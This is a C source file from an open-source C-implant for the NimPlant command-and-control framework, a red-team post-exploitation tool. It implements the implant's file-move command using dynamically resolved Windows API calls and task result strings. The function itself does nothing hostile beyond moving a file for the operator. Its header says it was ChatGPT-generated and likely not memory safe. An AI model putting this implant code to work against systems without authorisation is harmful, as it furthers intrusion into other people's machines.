/**
 * GNU General Public License, version 2.0.
 *
 * Copyright (c) 2025 Tijme Gommers (@tijme).
 *
 * This source code file is part of C-implant for NimPlant C2. 
 * Licensed under GNU General Public License, version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * Standard Input Output.
 * 
 * Defines three variable types, several macros, and various functions for performing input and output.
 * https://www.tutorialspoint.com/c_standard_library/stdio_h.htm
 */
#include <stdio.h>

/**
 * Standard Library.
 * 
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

/**
 * Windows API.
 * 
 * Contains declarations for all of the functions, macro's & data types in the Windows API.
 * https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN
 */
#include <windows.h>

/**
 * Booleans.
 * 
 * Defines boolean types.
 * https://pubs.opengroup.org/onlinepubs/007904975/basedefs/stdbool.h.html
 */
#include <stdbool.h>

/**
 * Move a file from source to destination.
 * 
 * @note This function was generated by ChatGPT and thus likely not (memory) safe.
 *
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param struct NimPlantConfig* config A struct with all settings for the current beacon.
 * @param struct NimPlantClient* client A struct with runtime client settings (such as encryption key).
 * @param struct NimPlantTask* lpTask The task that has to be performed and in which the result can be saved.
 * @returns bool Positive if successfully executed.
 */
bool CommandMv(struct Relocatable* context, struct NimPlantConfig* config, struct NimPlantClient* client, struct NimPlantTask* lpTask) {
    BOOL bResultStatus = false;
    char* lpResolvedSourcePath = NULL;
    char* lpResolvedDestPath = NULL;

    // There must be exactly two arguments: source file and destination path
    if (lpTask->argumentsCount != 2) goto INVALID_ARGUMENT_AND_RETURN;

    // Resolve the source path
    DWORD lpResolvedSourcePathLen = context->functions.strlen(lpTask->arguments[0]);
    lpResolvedSourcePath = (lpTask->arguments[0][0] == '\\' || (lpResolvedSourcePathLen >= 2 && lpTask->arguments[0][1] == ':')) 
        ? lpTask->arguments[0] 
        : ResolveRelativePath(context, lpTask->arguments[0]);
    if (lpResolvedSourcePath == NULL) goto CANNOT_RESOLVE_SOURCE_PATH_AND_RETURN;

    // Resolve the destination path
    DWORD lpResolvedDestPathLen = context->functions.strlen(lpTask->arguments[1]);
    lpResolvedDestPath = (lpTask->arguments[1][0] == '\\' || (lpResolvedDestPathLen >= 2 && lpTask->arguments[1][1] == ':')) 
        ? lpTask->arguments[1] 
        : ResolveRelativePath(context, lpTask->arguments[1]);
    if (lpResolvedDestPath == NULL) goto CANNOT_RESOLVE_DEST_PATH_AND_RETURN;

    // Move the file
    if (!context->functions.MoveFileA(lpResolvedSourcePath, lpResolvedDestPath)) goto CANNOT_MOVE_FILE_AND_RETURN;

    // Store success message
    DEFINE_STRING(lpSuccessMessage, "[file moved successfully]");
    lpTask->result = context->functions.calloc(context->functions.strlen(lpSuccessMessage) + 1, sizeof(char));
    if (lpTask->result == NULL) goto FAILURE_AND_RETURN;
    context->functions.strcpy(lpTask->result, lpSuccessMessage);

    bResultStatus = true;
    goto CLEANUP_AND_RETURN;

INVALID_ARGUMENT_AND_RETURN:
    DEFINE_STRING(lpInvalidArgument, "[invalid argument]");
    lpTask->result = context->functions.calloc(context->functions.strlen(lpInvalidArgument) + 1, sizeof(char));
    if (lpTask->result == NULL) goto FAILURE_AND_RETURN;
    context->functions.strcpy(lpTask->result, lpInvalidArgument);
    bResultStatus = true;
    goto CLEANUP_AND_RETURN;

CANNOT_RESOLVE_SOURCE_PATH_AND_RETURN:
    DEFINE_STRING(lpCannotResolveSourcePath, "[cannot resolve source path]");
    lpTask->result = context->functions.calloc(context->functions.strlen(lpCannotResolveSourcePath) + 1, sizeof(char));
    if (lpTask->result == NULL) goto FAILURE_AND_RETURN;
    context->functions.strcpy(lpTask->result, lpCannotResolveSourcePath);
    bResultStatus = true;
    goto CLEANUP_AND_RETURN;

CANNOT_RESOLVE_DEST_PATH_AND_RETURN:
    DEFINE_STRING(lpCannotResolveDestPath, "[cannot resolve destination path]");
    lpTask->result = context->functions.calloc(context->functions.strlen(lpCannotResolveDestPath) + 1, sizeof(char));
    if (lpTask->result == NULL) goto FAILURE_AND_RETURN;
    context->functions.strcpy(lpTask->result, lpCannotResolveDestPath);
    bResultStatus = true;
    goto CLEANUP_AND_RETURN;

CANNOT_MOVE_FILE_AND_RETURN:
    DEFINE_STRING(lpCannotMoveFile, "[cannot move file]");
    lpTask->result = context->functions.calloc(context->functions.strlen(lpCannotMoveFile) + 1, sizeof(char));
    if (lpTask->result == NULL) goto FAILURE_AND_RETURN;
    context->functions.strcpy(lpTask->result, lpCannotMoveFile);
    bResultStatus = true;
    goto CLEANUP_AND_RETURN;

FAILURE_AND_RETURN:
    if (lpTask->result != NULL) context->functions.free(lpTask->result);
    goto CLEANUP_AND_RETURN;

CLEANUP_AND_RETURN:
    goto RETURN;

RETURN:
    return bResultStatus;
}
